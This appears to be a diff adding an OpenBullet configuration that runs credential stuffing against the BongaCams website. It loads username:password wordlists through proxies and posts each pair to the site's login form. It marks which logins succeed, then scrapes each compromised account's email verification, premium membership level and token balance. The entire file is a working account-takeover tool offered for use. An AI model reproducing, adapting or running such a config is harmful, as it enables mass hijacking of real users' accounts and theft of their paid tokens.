@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "BongaCams",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-27T10:58:35.9852538-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://bongacams.com/login" 
+  CONTENT "log_in%5Busername%5D=<USER>&log_in%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+#key_check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "status\":\"success" 
+  KEYCHAIN Failure OR 
+    KEY "status\":\"error" 
+
+#get_account-info REQUEST GET "https://bongacams.com/account/account-info" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#parse_is-verified PARSE "<SOURCE>" LR "email_field_confirmed\">" "<" -> CAP "2FA" 
+
+#get_membership REQUEST GET "https://bongacams.com/members/account/membership" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#parse_membership PARSE "<SOURCE>" LR "Your current premium user level: <span class=\"bc_bold bc_uppercase\">" "<" -> CAP "Membership Status" 
+
+#parse_tokens PARSE "<SOURCE>" REGEX "\\d(?=</span>&nbsp)" "[0]" -> CAP "Tokens" 
+
